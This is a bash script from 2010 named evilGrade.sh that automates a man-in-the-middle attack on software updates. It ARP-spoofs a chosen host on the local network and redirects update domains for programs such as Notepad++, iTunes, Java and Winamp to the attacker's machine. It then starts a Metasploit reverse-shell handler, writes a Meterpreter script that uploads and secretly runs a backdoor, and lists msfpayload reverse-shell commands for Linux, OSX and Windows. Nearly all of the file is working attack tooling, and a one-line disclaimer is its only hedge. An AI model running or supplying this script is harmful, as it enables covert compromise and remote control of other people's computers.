#!/bin/bash
#----------------------------------------------------------------------------------------------#
#evilGrade.sh v0.3 (#1 2010-09-28)                                                             #
# (C)opyright 2010 - g0tmi1k                                                                   #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#              The programs are provided as is without any guarantees or warranty.             #
#---Defaults-----------------------------------------------------------------------------------#
# The interfaces to use
interface=eth0

#[/path/to/file] Where is the backdoor
backdoorPath=/pentest/windows-binaries/tools/sbd.exe

#---Variables----------------------------------------------------------------------------------#
verbose="0"                 # Shows more info. 0=normal, 1=more , 2=more+commands
 target=""                  # null the value
    svn="21"                # SVN Number
version="0.3 (#1)"          # Program version
trap 'cleanup interrupt' 2  # Interrupt - "Ctrl + C"

#----Functions---------------------------------------------------------------------------------#
function action() { #action title command #screen&file #x|y|lines #hold
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ ! -z "$3" ] && [ "$3" != "true" ] && [ "$3" != "false" ] ; then error="3" ; fi # Coding error
   if [ ! -z "$5" ] && [ "$5" != "true" ] && [ "$5" != "false" ] ; then error="5" ; fi # Coding error

   if [ "$error" == "free" ] ; then
      xterm="xterm" #Defaults
      command=$2
      x="100"
      y="0"
      lines="15"
      if [ "$5" == "true" ] ; then xterm="$xterm -hold" ; fi
      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi
      if [ ! -z "$4" ] ; then
         x=$(echo $4 | cut -d '|' -f1)
         y=$(echo $4 | cut -d '|' -f2)
         lines=$(echo $4 | cut -d '|' -f3)
      fi
      $xterm -geometry 100x$lines+$x+$y -T "evilGrade v$version - $1" -e "$command"
      return 0
   else
      display error "action. Error code: $error" 1>&2
      return 1
   fi
}
function cleanup() {
   if [ "$1" == "nonuser" ] ; then exit 3

   echo # Blank line
   if [ "$verbose" != "0" ] ; then display info "*** BREAK ***" ; fi # User quit

   display action "Restoring: Environment"
   action "Killing Programs" "killall python xterm"

   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then display action "Removing: Temp files" ; fi
   action "Removing files" "rm -rf /tmp/evilGrade*"

   echo -e "\e[01;36m[*]\e[00m Done! (= Have you... g0tmi1k?"
   exit 0
}
function help() {
   echo "(C)opyright 2010 g0tmi1k ~ http://g0tmi1k.blogspot.com

 Usage: bash evilGrade.sh -i [interface] -t [IP] -b [/path/to/file]


  Options:
   -i [interface]     ---  interface e.g. $interface
   -t [IP]            ---  Target IP e.g. 192.168.1.101

   -d [/path/to/file] ---  DEB file to use e.g. ~/my.deb


  Example:
   bash evilGrade.sh
   bash evilGrade.sh -i wlan0 -t 192.168.1.101 -d ~/my.deb

 Known issues:
    -Can't automate evilGrade!
"
   exit 1
}
function display() { #display type message
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ] ; then error="5" ; fi # Coding error

   if [ "$error" == "free" ] ; then
      output=""
      if [ "$1" == "action" ] ; then output="\e[01;32m[>]\e[00m"
      elif [ "$1" == "info" ] ; then output="\e[01;33m[i]\e[00m"
      elif [ "$1" == "diag" ] ; then output="\e[01;34m[+]\e[00m"
      elif [ "$1" == "error" ] ; then output="\e[01;31m[!]\e[00m" ; fi
      output="$output $2"
      echo -e "$output"

      return 0
   else
      display error "display. Error code: $error" 1>&2
      return 1
   fi
}
function update() { #update
   display action "Checking for an update"
   if [ -e "/usr/bin/svn" ] ; then
      command=$(svn info http://g0tmi1k.googlecode.com/svn/trunk/evilGrade/ | grep "Last Changed Rev:" | cut -c19-)
      if [ "$command" != "$svn" ] ; then
         display info "Updating"
         svn export -q --force "http://g0tmi1k.googlecode.com/svn/trunk/evilGrade" ./
         display info "Updated to $update (="
      else
         display info "You're using the latest version. (="
      fi
   else
      command=$(wget -qO- "http://g0tmi1k.googlecode.com/svn/trunk/" | grep "<title>g0tmi1k - Revision" |  awk -F " " '{split ($4,A,":"); print A[1]}')
      if [ "$command" != "$svn" ] ; then
         display info "Updating"
         wget -q -N "http://g0tmi1k.googlecode.com/svn/trunk/evilGrade/evilGrade.sh"
         display info "Updated! (="
      else
         display info "You're using the latest version. (="
      fi
   fi
   echo
   exit 2
}


#---Main---------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m \"(Semi)Automatic\" evilGrade v$version"

#----------------------------------------------------------------------------------------------#
if [ "$(id -u)" != "0" ] ; then display error "Run as root" 1>&2 ; cleanup nonuser; fi

#----------------------------------------------------------------------------------------------#
while getopts "i:t:b:vVuh?" OPTIONS; do
   case ${OPTIONS} in
      i   ) interface=$OPTARG;;
      t   ) targetIP=$OPTARG;;
      b   ) backdoorPath=$OPTARG;;
      v   ) verbose="1" ;;
      V   ) verbose="2" ;;
      u   ) update;;
      ?|h ) help;;
      *   ) display error "Unknown option" 1>&2 ;;   # Default
  esac
done
gateway=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
broadcast=$(ifconfig $interface | awk '/Bcast/ {split ($3,A,":"); print A[2]}')
networkmask=$(ifconfig $interface | awk '/Mask/ {split ($4,A,":"); print A[2]}')

#----------------------------------------------------------------------------------------------#
display action "Analyzing: Environment"

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then display action "Stopping: Programs" ; fi
action "Killing Programs" "killall python xterm"

#----------------------------------------------------------------------------------------------#
int=$(ifconfig -a | grep $interface | awk '{print $1}')
if [ "$int" != "$interface" ]; then
   echo "[-] The interface $interface, isnt correct." 1>&2
   cleanup
fi

if [ -z "$ourIP" ]; then
   $xterm -geometry 75x15+100+0 -T "[MFU] v$version - Starting network" "/etc/init.d/wicd start"
   sleep 1
   $xterm -geometry 75x15+100+0 -T "[MFU] v$version - Acquiring an IP Address" "dhclient $interface"
   sleep 3
   export ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
   if [ -z "$ourIP" ]; then
      echo "[-] IP Problem. Haven't got a IP address on $interface. Try running the script again, once you have!"
      cleanup
   fi
fi

if ! [ -e "$backdoorPath" ]; then
   echo "[-] There isn't a backdoor at $backdoorPath."
   cleanup
fi

#----------------------------------------------------------------------------------------------#
if [ -z "$target" ] ; then
   if [ ! -e "/usr/bin/nmap" ] ; then
      display error "Nmap isn't installed"
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install nmap" "apt-get -y install nmap" ; fi
      if [ ! -e "/usr/bin/nmap" ] ; then
         display error "Failed to install nmap" 1>&2 ; cleanup
      else
         display info "Installed: nmap"
      fi
   fi
   if [ ! -e "/usr/bin/nmap" ] ; then
      display error "Nmap isn't installed"
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install nmap" "apt-get -y install nmap" ; fi
      if [ ! -e "/usr/bin/nmap" ] ; then
         display error "Failed to install nmap" 1>&2 ; cleanup
      else
         display info "Installed: nmap"
      fi
   fi
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then display action "Scanning: Targets" ; fi
   loopMain="false"
   while [ "$loopMain" != "true" ] ; do
      ip4="${ourIP##*.}" ; x="${ourIP%.*}"
      ip3="${x##*.}" ; x="${x%.*}"
      ip2="${x##*.}" ; x="${x%.*}"
      ip1="${x##*.}"
      nm4="${networkmask##*.}" ; x="${networkmask%.*}"
      nm3="${x##*.}" ; x="${x%.*}"
      nm2="${x##*.}" ; x="${x%.*}"
      nm1="${x##*.}"
      let sn1="$ip1&$nm1"
      let sn2="$ip2&$nm2"
      let sn3="$ip3&$nm3"
      let sn4="$ip1&$nm4"
      let en1="$ip1|(255-$nm1)"
      let en2="$ip2|(255-$nm2)"
      let en3="$ip3|(255-$nm3)"
      let en4="$ip4|(255-$nm4)"
      subnet=$sn1.$sn2.$sn3.$sn4
      endnet=$en1.$en2.$en3.$en4
      oldIFS=$IFS ; IFS=.
      for dec in $networkmask ; do
         case $dec in
            255) let nbits+=8;;
            254) let nbits+=7;;
            252) let nbits+=6;;
            248) let nbits+=5;;
            240) let nbits+=4;;
            224) let nbits+=3;;
            192) let nbits+=2;;
            128) let nbits+=1;;
            0);;
            *) display error "Bad input: dec ($dec)" 1>&2 ; cleanup
          esac
      done
      IFS=$oldIFS
      action "Scanning Targets" "nmap $subnet/$nbits -e $interface -n -sP -sn | tee /tmp/sitm.tmp" #-O -oX sitm.nmap.xml
      echo -e " Num |        IP       |       MAC       |     Hostname    |   OS  \n-----|-----------------|-----------------|-----------------|--------"
      arrayTarget=( $(cat "/tmp/sitm.tmp" | grep "Nmap scan report for" | grep -v "host down" |  sed 's/Nmap scan report for //') )
      i="0"
      for targets in "${arrayTarget[@]}" ; do
         printf "  %-2s | %-15s | %-15s | %-15s | %-10s\n" "$(($i+1))" "${arrayTarget[${i}]}"
         i=$(($i+1))
      done
      echo "  $(($i+1))  | $broadcast   | *Everyone*"
      loopSub="false"
      while [ "$loopSub" != "true" ] ; do
         read -p "[~] re[s]can, [m]anual, e[x]it or select num: "
         if [ "$REPLY" == "x" ] ; then cleanup clean
         elif [ "$REPLY" == "m" ] ; then read -p "[~] IP address: " ; target="$REPLY" loopSub="true" ; loopMain="true"
         elif [ "$REPLY" == "s" ] ; then loopSub="true"
         elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ] ; then display error "Bad input" 1>&2
         elif [ "$REPLY" -lt "1" ] || [ "$REPLY" -gt "$i" ] ; then display error "Incorrect number" 1>&2
         else target=${arrayTarget[$(($REPLY-1))]} ; loopSub="true" ; loopMain="true"
         fi
      done
   done
fi
IP_ADDR_VAL=$(echo "$target" | grep -Ec '^(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])')
if [ $IP_ADDR_VAL -eq 0 ]; then
   display error "Bad IP"  $diagnostics 1>&2
   target=$(ifconfig $interface | awk '/Bcast/ {split ($3,A,":"); print A[2]}')
   display info "Setting target IP: $target (Broadcast for $interface)"
fi

#----------------------------------------------------------------------------------------------#
if [ ! -e "/pentest/exploits/isr-evilgrade/evilgrade" ] ; then
   display error "evilGrade isn't installed"
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then
      action "Install requirements" "wget -P /tmp ftp://ftp.uni-hannover.de/pub/mirror/bsd/FreeBSD/ports/distfiles/Data-Dump-1.08.tar.gz ; tar -C /tmp -xvf /tmp/Data-Dump-1.08.tar.gz ; rm /tmp/Data-Dump-1.08.tar.gz"
      action "Install requirements" "cd /tmp/Data-Dump-1.08 ; perl Makefile.PL ; make ; make install ; rm -rf /tmp/Data-Dump-1.08/"
      action "Install evilGrade" "wget -P /tmp/ http://www.infobyte.com.ar/down/isr-evilgrade-1.0.0.tar.gz ; tar -C /pentest/exploits/ -xvf /tmp/isr-evilgrade-1.0.0.tar.gz ; rm -f /tmp/isr-evilgrade-1.0.0.tar.gz"
   fi
   if [ ! -e "/pentest/exploits/isr-evilgrade/evilgrade" ] ; then
      display error "Failed to install evilGrade" 1>&2 ; cleanup
   else
      display info "Installed: evilGrade"
   fi
fi

#----------------------------------------------------------------------------------------------#
display action "Configuring: Environment"

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then display action "Stopping: Daemons" ; fi
action "Killing services" "/etc/init.d/apache2 stop"

#----------------------------------------------------------------------------------------------#
display action "Configuring: Network"
ifconfig lo up
echo "1" > /proc/sys/net/ipv4/ip_forward
command=$(cat /proc/sys/net/ipv4/ip_forward)
if [ $command != "1" ] ; then display error "Can't enable ip_forward" 1>&2 ; cleanup ; fi
#echo "1" > /proc/sys/net/ipv4/conf/$interface/forwarding

#----------------------------------------------------------------------------------------------#
display action "Creating: Scripts"
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
   path="/tmp/evilGrade.rb" # Metasploit script
   if [ -e "$path" ] ; then rm "$path" ; fi
   echo -e "#! /usr/bin/env ruby
# evilGrade.rb v$version

print_line(\"[>] evilGrade v$version...\")

session = client

host,port = session.tunnel_peer.split(':')
print_status(\"New session found on #{host}:#{port}...\")

print_status(\"Uploading backdoor.exe ($backdoorPath)...\")
session.fs.file.upload_file(\"%SystemDrive%\\\backdoor.exe\", \"$backdoorPath\")
print_status(\"Uploaded!\")
sleep(1)

print_status(\"Executing backdoor.exe...\")
session.sys.process.execute(\"C:\\\backdoor.exe\", nil, {'Hidden' => true})   #Had a problem with %SystemDrive%
print_status(\"Executed!\")
sleep(1)

print_status(\"Downloading proof...\")
session.sys.process.execute(\"cmd.exe /C ipconfig | find \\\"IP\\\" > \\\"%SystemDrive%\\\ip.log\", nil, {'Hidden' => true})
sleep(1)
session.fs.file.download_file(\"/tmp/fakeAP_pwn.lock\", \"%SystemDrive%\\\ip.log\")
sleep(1)
session.sys.process.execute(\"cmd.exe /C del /f \\\"%SystemDrive%\\\ip.log\", nil, {'Hidden' => true})
print_status(\"Downloaded! \")
sleep(1)

print_status(\"Done! (= Have you... g0tmi1k?\")
sleep(1)
" >> $path
   if [ "$verbose" == "2" ]  ; then echo "Created: $path" ; fi
   if [ ! -e "$path" ] ; then display error "Couldn't create $path" 1>&2 ; cleanup; fi
fi
#----------------------------------------------------------------------------------------------#
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
   path="/tmp/evilGrade.dns" # DNS script
   if [ -e "$path" ] ; then rm "$path" ; fi
   echo -e "# fakeAP_pwn.dns v$version
$ourIP notepad-plus.sourceforge.net
$ourIP notepadplus.sourceforge.net
$ourIP update.speedbit.com
$ourIP online.speedbit.com
$ourIP itunes.com
$ourIP swscan.apple.com
$ourIP download.linkedin.com
$ourIP update23.services.openoffice.org
$ourIP update.services.openoffice.org
$ourIP java.sun.com
$ourIP client.winamp.com
$ourIP www.winamp.com
$ourIP update.winzip.com
" >> $path
   if [ "$verbose" == "2" ]  ; then echo "Created: $path" ; fi
   if [ ! -e "$path" ] ; then display error "Couldn't create $path" 1>&2 ; cleanup; fi
fi

#----------------------------------------------------------------------------------------------#
display action "Starting: Exploit"
action "Metasploit (Windows)" "/pentest/exploits/framework3/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$ourIP AutoRunScript=/tmp/evilGrade.rb E" "true" "0|265|15" &
sleep 5

#----------------------------------------------------------------------------------------------#
display action "Starting: ARP Attack"
action "ARPSpoof" "arpspoof -i $interface -t $target $gateway" "true" "0|80|5" &
sleep 1

#----------------------------------------------------------------------------------------------#
display action "Starting: DNS"
action "DNSSpoof" "dnsspoof -i $interface -f /tmp/evilGrade.dns" "true" "0|173|5" &
sleep 1

#---------------------------------------------------------------------------------- ------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then
   display action "Monitoring: Connections"
   action "Connections" "watch -d -n 1 \"arp -n -v -i $apInterface\"" "false" "0|487|5" & # Don't wait, do the next command
fi

#----------------------------------------------------------------------------------------------#
display action "Starting: SBD"
action "SBD" "sbd -l -k g0tmi1k -p 7333" "true" "0|580|10" &
sleep 1

#----------------------------------------------------------------------------------------------#
# Cant automate this bit! )=
echo "[>] Starting EvilGrade...
Commands:
1.) Programs: (show modules)
  config notepadplus
  config osx
  config itunes
  config sunjava
  config winzip
  config winamp
  config openoffice
  config linkedin
  config speedbit
  config dap

2.) Payloads: (show options)
Linux
  set agent '[\"/pentest/exploits/framework3/msfpayload linux/x86/shell/reverse_tcp LHOST=$ourIP X > <%OUT%>/tmp/evilGrade.exe<%OUT%>\"]'
OSX
  set agent '[\"/pentest/exploits/framework3/msfpayload osx/x86/shell_reverse_tcp LHOST=$ourIP X > <%OUT%>/tmp/evilGrade.exe<%OUT%>\"]'
Windows
  set agent '[\"/pentest/exploits/framework3/msfpayload windows/meterpreter/reverse_tcp LHOST=$ourIP X > <%OUT%>/tmp/evilGrade.exe<%OUT%>\"]'

3.) start

4.) exit or \"Ctrl + C\""
tmp=$(pwd)
cd "/pentest/exploits/isr-evilgrade"
./evilgrade
cd "$tmp"

#----------------------------------------------------------------------------------------------#
cleanup clean
